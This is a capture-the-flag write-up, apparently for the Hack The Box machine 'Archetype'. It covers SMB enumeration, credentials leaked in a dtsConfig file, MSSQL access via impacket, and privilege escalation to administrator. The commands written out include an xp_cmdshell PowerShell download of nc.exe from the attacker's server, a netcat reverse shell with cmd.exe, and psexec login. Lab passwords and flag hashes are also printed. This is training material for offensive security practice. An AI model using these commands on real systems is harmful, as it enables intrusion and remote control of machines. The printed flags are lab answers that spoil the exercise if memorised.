# Enumeration

```nmap -sV -O -Pn 10.10.10.27```

![grafik](https://user-images.githubusercontent.com/84674087/130489807-df449044-ed18-4a2c-a8f4-ad85af5c4946.png)

# Exploitation

## 445/TCP SMB (Server 2008 R2)

* Let us start with the file sharing service SMB
* The tool "smbclient" is handy to use

```smbclient --no-pass -L 10.10.10.27```

![grafik](https://user-images.githubusercontent.com/84674087/130490914-42470a10-d0b5-4f9f-93bd-e07ae22ffaae.png)

* We can try to read the share "backups", which seems promising ... 

```smbclient --no-pass -L //10.10.10.27/backups```

![grafik](https://user-images.githubusercontent.com/84674087/130491116-0266f4f6-9d16-49f6-87cb-51e8c639254d.png)


> dtsConfig:
> > A configuration file written in XML, which is used to apply property values to SQL Server Integration Services (SSIS) packages.
> > SSIS packages are used to automate extraction, transformation, and loading operations to/from DBMS. It may contain sensitive information (!) and thus the access should be restricted (BlueTeam!). 


* When using the command "more" we can check the content of prod.dtsConfig
* And we discover credentials: 
  * User ID: **ARCHETYPE\sql_svc**
  * Password: **M3g4c0rp123**

![grafik](https://user-images.githubusercontent.com/84674087/130491457-7e4f196a-6e2e-4ab5-a1ae-42889ca8c8b2.png)

## 1433/TCP MS SQL

* Let us continue with MS SQL after obtaining credentials for the corresponding DB
* A useful python tool at this stage is impacket: https://github.com/SecureAuthCorp/impacket
* Description: "A collection of Python classes for working with network protocols"
* Within this package we find "mssqlclient" which we are going to use as shown below

```python3 mssqlclient.py ARCHETYPE/sql_svc@10.10.10.27 -windows-auth```

![grafik](https://user-images.githubusercontent.com/84674087/130493787-a125d7ea-1a5d-43b1-b8a7-87fb0a5ee7ce.png)

* Let us try to establish a reverse shell
  1. Download nc from https://github.com/int0x33/nc.exe/blob/master/nc.exe
  2. Start HTTP Server on your machine (in same directoy where nc.exe is located)
  3. Invoke shell via mssqlclient
  4. Download nc.exe via SQL shell
  5. Start a netcat listening job in a separate terminal on your own machine
  6. Execute netcat on victim machine (beforehand: check the IPv4 of your HTB-VPN connection)

```
python -m http.server 80
xp_cmdshell powershell wget -UseBasicParsing http://10.10.16.79:80/nc.exe -o %userprofile%/nc.exe
nc -lvnp 4444
ifconfig
xp_cmdshell powershell %userprofile%/nc.exe -nv 10.10.16.79 4444 -e cmd.exe
```

![grafik](https://user-images.githubusercontent.com/84674087/130494828-27273e09-62e1-4a08-99c9-9a0850f33ce1.png)

![grafik](https://user-images.githubusercontent.com/84674087/130494843-8163545c-18bb-47cb-bbb2-3dd48fa75d09.png)

![grafik](https://user-images.githubusercontent.com/84674087/130494864-39441aa4-8c44-4d7c-b73d-581abef1c5d5.png)

![grafik](https://user-images.githubusercontent.com/84674087/130495197-6f709b62-5b08-4728-9b6d-85f0ded8fe8b.png)

![grafik](https://user-images.githubusercontent.com/84674087/130495313-155f974b-d172-4c47-97df-165b07b8b99b.png)

* After searching through the file system we can find the USER FLAG on Desktop
  * user.txt: **3e7b102e78218e935bf3f4951fec21a3**

![grafik](https://user-images.githubusercontent.com/84674087/130495456-fe714750-e688-4611-9665-1d1d226553e7.png)

### Admin Flag

* One option is the lookup of powershell command history
* This discloses the admin password: **MEGACORP_4dm1n!!**

```cd %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine```

![grafik](https://user-images.githubusercontent.com/84674087/130495725-669e3c9d-74f5-4bee-97a3-e6800b4365b5.png)

* *Option A*: Logon as Administrator via smbclient on C$
* *Option B*: Utilize psexec.py from python-impacket

```
smbclient -U administrator \\\\10.10.10.27\\C$
psexec.py Administrator@10.10.10.27
```

![grafik](https://user-images.githubusercontent.com/84674087/130496127-3b55f9bf-0180-43ba-8758-9acfb2da0946.png)

![grafik](https://user-images.githubusercontent.com/84674087/130496139-571d103e-fb4c-4b87-a5b7-7e92b17d2644.png)

![grafik](https://user-images.githubusercontent.com/84674087/130496178-3517b04d-8ac5-49c8-9af6-4cb678b92f5c.png)

--> On Desktop we find root.txt: **b91ccec3305e98240082d4474b848528**
